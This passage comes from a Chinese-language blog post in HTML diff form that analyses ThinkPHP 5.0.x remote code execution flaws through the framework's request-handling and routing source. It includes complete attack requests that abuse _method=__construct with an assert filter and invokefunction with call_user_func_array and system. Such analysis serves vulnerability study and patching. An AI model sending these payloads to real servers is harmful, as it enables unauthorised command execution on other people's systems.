+            <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">method</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">// 自动获取请求变量</span>
+            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">case</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
+                    <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">post</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">case</span> <span class="token string">'PUT'</span><span class="token punctuation">:</span>
+                <span class="token keyword">case</span> <span class="token string">'DELETE'</span><span class="token punctuation">:</span>
+                <span class="token keyword">case</span> <span class="token string">'PATCH'</span><span class="token punctuation">:</span>
+                    <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">put</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token keyword">default</span><span class="token punctuation">:</span>
+                    <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            <span class="token comment" spellcheck="true">// 当前请求参数和URL地址中的参数合并</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span>      <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">route</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mergeParam</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// 获取包含文件上传信息的数组</span>
+            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p><code>$this-&gt;param</code>通过<code>array_merge</code>将当前请求参数和URL地址中的参数合并。而前面已经通过<code>__construct</code>设置了<code>$this-&gt;get</code>为<code>ipconfg</code>。此后<code>$this-&gt;param</code>其值被设置为：</p>
+<pre><code>array (size=1)
+  0 =&gt; string &#39;ipconfig&#39; (length=8)</code></pre><p>然后执行<code>input</code>方法</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+      <span class="token comment" spellcheck="true">// 解析过滤器       </span>
+<span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string">'filterValue'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+      <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filterValue</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span></code></pre>
+<p>这里的data正是前面的<code>$this-&gt;param</code>进入<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p>
+<p>调用<code>filterValue</code></p>
+<p>跟上该方法:</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201213171617698.png" alt=""></p>
+<p>看到这里应该都懂了回调函数调用我们的精心构造的值最终导致了RCE。</p>
+<h3 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h3><p>这里虽然表面上可以通过调用回调函数执行任意任意代码，但并非所有函数都可以。比如我们使用<code>assert</code>函数来执行<code>phpinfo()</code>命令。</p>
+<p>你会发现执行失败，在debug开启下我们可以清晰的看到其报错原因:<br><img src="https://picbed.easy233.top//imgimage-20201213172421090.png" alt="image-20201213172421090"></p>
+<p>这个POST在哪里来的?</p>
+<p>其实在上面<code>param</code>方法的时候我故意讲漏了一点:<br><img src="https://picbed.easy233.top//imgimage-20201213172726118.png" alt=""></p>
+<p>这里在调用了一次<code>method</code>方法:</p>
+<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">===</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// 获取原始请求类型</span>
+            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">'GET'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>进入<code>server</code>方法</p>
+<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">server</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">server</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">server</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">server</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">server</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">server</span><span class="token punctuation">,</span> <span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$name</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>可以看到其再去调用了<code>input</code>方法:</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201213175135590.png" alt=""></p>
+<p>本质就是取<code>name</code>数组中的<code>REQUEST_METHOD</code>的值</p>
+<p>我们上面使用的payload后该值为<code>REQUEST_METHOD</code>为<code>POST</code></p>
+<p>最后带进入<code>call_user_func(&#39;assert&#39;,&#39;POST&#39;)</code>引发开始的那个报错，剩下的代码也停止了执行。非常有趣的一点是<code>system</code>在上面这种情况并不会报错。如下测试代码；</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p><img src="https://picbed.easy233.top//imgimage-20201213175632002.png" alt=""></p>
+<p>没有这个system这个命令php并不会报错而是执行下去，正是这个特征才使得我们进入第二次input函数中执行我们的payload。</p>
+<p>但是因为可以使用变量覆盖，所以其实我们其实也可以直接把<code>REQUEST_METHOD</code>变量覆盖成我们想要的值。这里就可以得到一个更加通用的payload:</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//easy.test/thinkphp_5.0.22_with_extend_3/public/index.php</span>
+<span class="token constant">POST</span>
+_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>assert<span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token constant">REQUEST_METHOD</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="https://picbed.easy233.top//imgimage-20201213181016562.png" alt=""></p>
+<h3 id="未开启debug模式下RCE"><a href="#未开启debug模式下RCE" class="headerlink" title="未开启debug模式下RCE"></a>未开启debug模式下RCE</h3><p>thinkphp5.2.2默认是未开启debug的，其实rce的原理也一样。这里只讲解和开启debug的一些不同的地方。</p>
+<p><code>thinkphp/library/think/App.php</code>下我们继续看<code>exec</code>方法</p>
+<p><code>$data = self::exec($dispatch, $config);</code></p>
+<p><img src="https://picbed.easy233.top//imgimage-20201213181851681.png" alt=""></p>
+<p>从中开启debug模式哪里分析我们可以得到要想rce一个重要点就是进入这里面的<code>Request::param()</code>方法中。</p>
+<p>在在thinkphp5完整版中官网揉进去了一个验证码的路由，也就是我们常见payload中的<code>s=captcha</code> 其<code>$dispatch[&#39;type&#39;]</code></p>
+<p>就是<code>method</code>进入该分支。值得注意的是我们请求的路由是<code>?s=captcha</code>，它对应的注册规则为<code>\think\Route::get</code>。在<code>method</code>方法结束后，返回的<code>$this-&gt;method</code>值应为<code>get</code>这样才能不出错，所以payload中有个<code>method=get</code></p>
+<p>剩下的和前面的debug的下流程一模一样了最后附上最终payload:</p>
+<pre><code>http://easy.test/thinkphp_5.0.22_with_extend_3/public/index.php?s=captcha
+POST:
+_method=__construct&amp;filter[]=assert&amp;method=get&amp;server[REQUEST_METHOD]=phpinfo()</code></pre><p><img src="https://picbed.easy233.top//imgimage-20201213182750080.png" alt=""></p>
+<h2 id="未开启强制路由命令执行"><a href="#未开启强制路由命令执行" class="headerlink" title="未开启强制路由命令执行"></a>未开启强制路由命令执行</h2><p>这个比上面这个理解起来则容易得多了。漏洞的根本原因在于框架对控制器没有进行足够的检查导致了任意调用类的方法最终导致RCE.</p>
+<p>首先我们可以看到默认配置中强制路由是默认关闭的:</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201214112500931.png" alt=""></p>
+<p>小s是兼容模式变量名称，是可以通过配置文件更改的。</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201214112937689.png" alt=""></p>
+<p>payload如下:</p>
+<pre><code>http://easy.test/thinkphp_5.0.22_with_extend_3/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</code></pre><p><img src="https://picbed.easy233.top//imgimage-20201214121118471.png" alt=""></p>
+<p>我们先简单分析一下路由在解析的整个流程</p>
+<p>从<code>thinkphp/library/think/App.php</code>开始前面有些细节已经讲过这里就不多做细说了，首先进入<code>self::routeCheck($request, $config);</code>中。</p>
+<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">routeCheck</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$config</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$path</span>   <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$depr</span>   <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'pathinfo_depr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 路由检测</span>
+        <span class="token variable">$check</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">is_null</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$routeCheck</span><span class="token punctuation">)</span> <span class="token operator">?</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$routeCheck</span> <span class="token punctuation">:</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'url_route_on'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$check</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// 开启路由</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token constant">RUNTIME_PATH</span> <span class="token punctuation">.</span> <span class="token string">'route.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">// 读取路由缓存</span>
+                <span class="token variable">$rules</span> <span class="token operator">=</span> <span class="token keyword">include</span> <span class="token constant">RUNTIME_PATH</span> <span class="token punctuation">.</span> <span class="token string">'route.php'</span><span class="token punctuation">;</span>
+                <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$rules</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">rules</span><span class="token punctuation">(</span><span class="token variable">$rules</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'route_config_file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token constant">CONF_PATH</span> <span class="token punctuation">.</span> <span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token constant">CONF_EXT</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token comment" spellcheck="true">// 导入路由配置</span>
+                        <span class="token variable">$rules</span> <span class="token operator">=</span> <span class="token keyword">include</span> <span class="token constant">CONF_PATH</span> <span class="token punctuation">.</span> <span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token constant">CONF_EXT</span><span class="token punctuation">;</span>
+                        <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$rules</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token variable">$rules</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token comment" spellcheck="true">// 路由检测（根据路由定义返回不同的URL调度）</span>
+            <span class="token variable">$result</span> <span class="token operator">=</span> Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$depr</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'url_domain_deploy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$must</span>   <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">is_null</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$routeMust</span><span class="token punctuation">)</span> <span class="token operator">?</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$routeMust</span> <span class="token punctuation">:</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'url_route_must'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$must</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">// 路由无效</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RouteNotFoundException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$result</span> <span class="token operator">=</span> Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">parseUrl</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$depr</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'controller_auto_search'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>进入if语句块，如果有路由缓存会读路由缓存，没有的话会读<code>/application/route.php</code>导入路由，经过<code>Route::check()</code>后，会拿<code>$config[&#39;url_route_must&#39;]</code>来判断是否是强路由，如果是强路由会抛出<code>throw new RouteNotFoundException()</code> 异常。到这里也就可以看到为什么开启强路由不行了。</p>
+<p>并非注册路由这里经过<code>Route::check</code>会放回False，会进入<code>Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;])</code>自动解析<code>模块/控制器/操作/参数</code>。</p>
+<p>我们更进查看:</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201214170347504.png" alt="image-20201214170347504"></p>
+<p><code>$depr</code>在配置文件中可以查看到为<code>/</code>,先把$url中的<code>/</code>替换成<code>|</code>然后给<code>self::parseUrlPath()</code>方法进行处理。更进查看：</p>
+<pre class=" language-php"><code class="language-php">    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">parseUrlPath</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// 分隔符替换 确保路由定义使用统一的分隔符</span>
+        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// [模块/控制器/操作?]参数1=值1&amp;参数2=值2...</span>
+            <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// [模块/控制器/操作]</span>
+            <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$url</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span></code></pre>
+<p>首先是把<code>$url</code>中的<code>|</code>替换成为<code>/</code> ,然后通过<code>/</code>作为分隔符把<code>$url</code>打乱成为数组。</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201214171145347.png" alt=""></p>
+<p>可以看到最终得到了我们想要访问的方法:</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201214171435578.png" alt=""></p>
+<p>然后返回我们的主方法中进入应用调度方法<code>App::exec()</code>,然后进入<code>module</code>模块:</p>
+<p><img src="https://picbed.easy233.top//imgimage-20201214172037336.png" alt=""></p>
+<p>其中会调用App内的静态方法通过反射实现调用模块/控制器/操作。</p>
+<p>我们看<code>self::module</code>方法中的最后一行:</p>
+<p><code>return self::invokeMethod($call, $vars);</code></p>
+<p>查看<code>self::invokeMethod($call, $vars);</code>方法</p>
+<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">invokeMethod</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$class</span>   <span class="token operator">=</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$method</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">invokeClass</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$reflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>ReflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
